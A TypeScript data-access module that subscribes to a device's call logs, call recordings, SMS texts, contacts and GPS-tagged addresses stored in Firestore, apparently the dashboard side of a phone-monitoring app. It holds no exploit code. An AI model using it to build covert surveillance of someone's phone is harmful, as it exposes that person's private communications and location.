import { doc, onSnapshot, arrayUnion, setDoc, getDoc } from 'firebase/firestore';
import { storageFirestore } from './firebaseConfig';

export interface CallLogItem {
  id: string;
  type: string;
  name: string;
  number: string;
  duration: string;
  date: string;
  address: string;
  hasRecording?: boolean;
  audioUrl?: string | null;
}

export interface SmsLogItem {
  id: string;
  type: string;
  name: string;
  message: string;
  number: string;
  date: string;
  address: string;
}

export interface ContactItem {
  name: string;
  number: string;
}

export const StorageRepository = {
  // Subscribe to call logs list
  subscribeCallLogs(deviceId: string, onUpdate: (calls: CallLogItem[]) => void) {
    const docRef = doc(storageFirestore, 'devices', deviceId, 'calls', 'log');
    return onSnapshot(docRef, (docSnap) => {
      if (docSnap.exists()) {
        const items = docSnap.data().items as any[] || [];
        const calls = items.map((c, i) => {
          const dateLong = c.date || 0;
          const dateStr = dateLong > 0 ? new Date(dateLong).toLocaleString() : '';
          return {
            id: c.id || String(i),
            type: c.type || 'Incoming',
            name: c.name || '',
            number: c.number || '',
            duration: c.duration || '0',
            date: dateStr,
            address: c.address || 'GPS Tracked',
            hasRecording: c.hasRecording || false,
            audioUrl: c.audioUrl || null
          };
        });
        onUpdate(calls);
      } else {
        onUpdate([]);
      }
    });
  },

  // Delete a specific call log item
  async deleteCallLog(deviceId: string, callLogItem: CallLogItem) {
    const docRef = doc(storageFirestore, 'devices', deviceId, 'calls', 'log');
    const docSnap = await getDoc(docRef);
    if (docSnap.exists()) {
      const items = docSnap.data().items as any[] || [];
      // Filter out the selected call
      const updated = items.filter(
        (c) => !(c.id === callLogItem.id || (c.number === callLogItem.number && c.date === new Date(callLogItem.date).getTime()))
      );
      await setDoc(docRef, { items: updated }, { merge: true });
    }
  },

  // Subscribe to SMS logs list
  subscribeSmsLogs(deviceId: string, onUpdate: (sms: SmsLogItem[]) => void) {
    const docRef = doc(storageFirestore, 'devices', deviceId, 'sms', 'log');
    return onSnapshot(docRef, (docSnap) => {
      if (docSnap.exists()) {
        const items = docSnap.data().items as any[] || [];
        const sms = items.map((s, i) => {
          const dateLong = s.date || 0;
          const dateStr = dateLong > 0 ? new Date(dateLong).toLocaleString() : '';
          return {
            id: s.id || String(i),
            type: s.type || 'Incoming',
            name: s.name || '',
            message: s.message || '',
            number: s.number || '',
            date: dateStr,
            address: s.address || 'GPS Tracked'
          };
        });
        onUpdate(sms);
      } else {
        onUpdate([]);
      }
    });
  },

  // Subscribe to deleted SMS list
  subscribeDeletedSmsIds(deviceId: string, onUpdate: (ids: string[]) => void) {
    const docRef = doc(storageFirestore, 'devices', deviceId, 'config', 'deleted_sms');
    return onSnapshot(docRef, (docSnap) => {
      if (docSnap.exists()) {
        onUpdate(docSnap.data().ids || []);
      } else {
        onUpdate([]);
      }
    });
  },

  // Hide / Delete an SMS (adding to blacklist)
  async deleteSms(deviceId: string, smsId: string) {
    const docRef = doc(storageFirestore, 'devices', deviceId, 'config', 'deleted_sms');
    await setDoc(docRef, { ids: arrayUnion(smsId) }, { merge: true });
  },

  // Subscribe to contacts list
  subscribeContacts(deviceId: string, onUpdate: (contacts: ContactItem[]) => void) {
    const docRef = doc(storageFirestore, 'devices', deviceId, 'contacts', 'list');
    return onSnapshot(docRef, (docSnap) => {
      if (docSnap.exists()) {
        const items = docSnap.data().items as any[] || [];
        const contacts = items.map((c) => ({
          name: c.name || '',
          number: c.number || ''
        }));
        onUpdate(contacts);
      } else {
        onUpdate([]);
      }
    });
  }
};
